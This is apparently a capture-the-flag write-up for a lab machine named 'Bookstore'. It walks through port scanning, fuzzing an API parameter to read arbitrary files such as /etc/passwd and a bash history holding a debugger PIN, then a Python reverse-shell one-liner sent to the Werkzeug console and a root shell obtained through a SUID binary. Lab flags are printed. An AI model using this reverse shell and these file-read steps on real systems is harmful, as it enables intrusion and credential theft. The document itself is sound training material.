# Bookstore

A Beginner level box with basic web enumeration and REST API Fuzzing.

# User flag

Nmap discovers 3 open ports:

~~~
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
|   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
|_  256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Book Store
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
| http-robots.txt: 1 disallowed entry 
|_/api </p> 
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Port 80

There is no `robots.txt` file, and gobuster doesn't find any interesting resource, but the main web page contains an interesting comment:

~~~
┌──(kali㉿kali)-[/data/Bookstore]
└─$ curl -s http://10.10.244.142/login.html | tail
<!--===============================================================================================-->
	<script src="more_css/vendor/daterangepicker/moment.min.js"></script>
	<script src="more_css/vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
	<script src="more_css/vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
	<script src="more_css/js/main.js"></script>
				<!--Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file -->
</body>
</html>
~~~

Not sure what `the debugger pin is inside sid's bash history file` really means at this stage, but likely a hint for the next steps.

## Port 5000

Running gobuster on port 5000 will highlight 2 interesting resources:

~~~
┌──(kali㉿kali)-[/data/vpn]
└─$ gobuster dir -u http://10.10.244.142:5000/ -x php,txt,bak,old,tar,zip -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.244.142:5000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,bak,old,tar,zip,php
[+] Timeout:                 10s
===============================================================
2021/05/09 18:49:43 Starting gobuster in directory enumeration mode
===============================================================
/api                  (Status: 200) [Size: 825]
/console              (Status: 200) [Size: 1985]
/robots.txt           (Status: 200) [Size: 45]  
/robots.txt           (Status: 200) [Size: 45]  
                                                
===============================================================
2021/05/09 19:06:00 Finished
===============================================================
~~~

Accessing the `/api` resource reveals the following content:

~~~
┌──(kali㉿kali)-[/data/Bookstore]
└─$ curl -s http://10.10.244.142:5000/api

    <title>API Documentation</title>
    <h1>API Documentation</h1>
    <h3>Since every good API has a documentation we have one as well!</h3>
    <h2>The various routes this API currently provides are:</h2><br>
    <p>/api/v2/resources/books/all (Retrieve all books and get the output in a json format)</p>
    <p>/api/v2/resources/books/random4 (Retrieve 4 random records)</p>
    <p>/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)</p>
    <p>/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)</p>
    <p>/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)</p>
    <p>/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)</p>
~~~

The access to the console is protected by a PIN. Back to the api.

Seing `/api/v2` may be an indication that there is a version 1. Let's check:

~~~
┌──(kali㉿kali)-[/usr/share/wordlists/SecLists/Fuzzing]
└─$ curl -s http://10.10.244.142:5000/api/v1/resources/books?id=1
[
  {
    "author": "Ann Leckie ", 
    "first_sentence": "The body lay naked and facedown, a deathly gray, spatters of blood staining the snow around it.", 
    "id": "1", 
    "published": 2014, 
    "title": "Ancillary Justice"
  }
]
~~~

## Fuzzing the API (v1)

Now, let's fuzz the API (v1) to find a possible parameter that would allow to read arbitrary files. At this stage, we recall the hint found in the beginning, which is now making sense. The PIN number that will grant us access to the console can be found in sid's bash history (`/home/sid/.bash_history`).

~~~
┌──(kali㉿kali)-[/data/Bookstore/files]
└─$ wfuzz -w /usr/share/wordlists/dirb/common.txt --hc=404 "http://10.10.244.142:5000/api/v1/resources/books?FUZZ=/etc/passwd"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.244.142:5000/api/v1/resources/books?FUZZ=/etc/passwd
Total requests: 4614

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                            
=====================================================================

000000517:   200        1 L      1 W        3 Ch        "author"                                           
000001964:   200        1 L      1 W        3 Ch        "id"                                               
000003215:   200        1 L      1 W        3 Ch        "published"                                        
000003645:   200        30 L     38 W       1555 Ch     "show"                                             

Total time: 0
Processed Requests: 4614
Filtered Requests: 4610
Requests/sec.: 0

~~~

The `show` parameter seems to be vulnerable to injection.

## User flag

Let's read the user flag.

~~~
┌──(kali㉿kali)-[/usr/share/wordlists/SecLists/Fuzzing]
└─$ curl -s "http://10.10.244.142:5000/api/v1/resources/books?show=/home/sid/user.txt"     
4ea65eb80ed441adb68246ddf7b964ab
~~~

# Root flag

## Console

Now, we can read the bash history to find the PIN number:

~~~
└─$ curl -s "http://10.10.244.142:5000/api/v1/resources/books?show=/home/sid/.bash_history"
cd /home/sid
whoami
export WERKZEUG_DEBUG_PIN=123-321-135
echo $WERKZEUG_DEBUG_PIN
python3 /home/sid/api.py
ls
exit
~~~

Access to the console is not granted, with the PIN (`123-321-135`).

Now, start a listener (`nc -nlvp 4444`) and send a reverse shell command to the console:

~~~
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.50.72",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
~~~

At this stage, add your SSH public key to `/home/sid/.ssh/authorized_keys` and connect via SSH directly.

## Reverse Engineering (try-harder)

There is an interesting file (`/home/sid/try-harder`) in the home folder, because it has the SUID bit set. I downloaded a copy of the binary and analyzed it in Hopper. Below is the pseudo code of the `main()` function:


```c
int main() {
    setuid(0x0);
    puts("What's The Magic Number?!");
    __isoc99_scanf(0x8ee);
    if ((var_14 ^ 0x1116 ^ 0x5db3) == 0x5dcd21f4) {
            system("/bin/bash -p");
    }
    else {
            puts("Incorrect Try Harder");
    }
    rax = *0x28 ^ *0x28;
    if (rax != 0x0) {
            rax = __stack_chk_fail();
    }
    return rax;
}
```

The program prompts for a number, XORs it with `0x1116` and `0x5db3` and expects the result to be equal to `0x5dcd21f4`. If the result is correct, a root shell will be spawned.

Let's do the reverse operation to get the expected value:

~~~
┌──(kali㉿kali)-[/data/Bookstore/files]
└─$ python3 -c "print(0x5dcd21f4^0x5db3^0x1116)"
1573743953
~~~

## Root shell

Now, let's enter the magic number to get the root shell and read the root flag.

~~~
sid@bookstore:~$ ./try-harder 
What's The Magic Number?!
1573743953
root@bookstore:~# id
uid=0(root) gid=1000(sid) groups=1000(sid)
root@bookstore:~# cd /root/
root@bookstore:/root# ll
total 40
drwx------  6 root root 4096 Oct 20  2020 ./
drwxr-xr-x 23 root root 4096 Oct 20  2020 ../
-rw-------  1 root root  492 Oct 20  2020 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  3 root root 4096 Oct 20  2020 .cache/
drwx------  3 root root 4096 Oct 20  2020 .gnupg/
drwxr-xr-x  3 root root 4096 Oct 20  2020 .local/
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   33 Oct 19  2020 root.txt
drwxr-xr-x  2 sid  sid  4096 Oct 20  2020 s/
root@bookstore:/root# cat root.txt 
e29b05fba5b2a7e69c24a450893158e3
~~~

Root flag: `e29b05fba5b2a7e69c24a450893158e3`
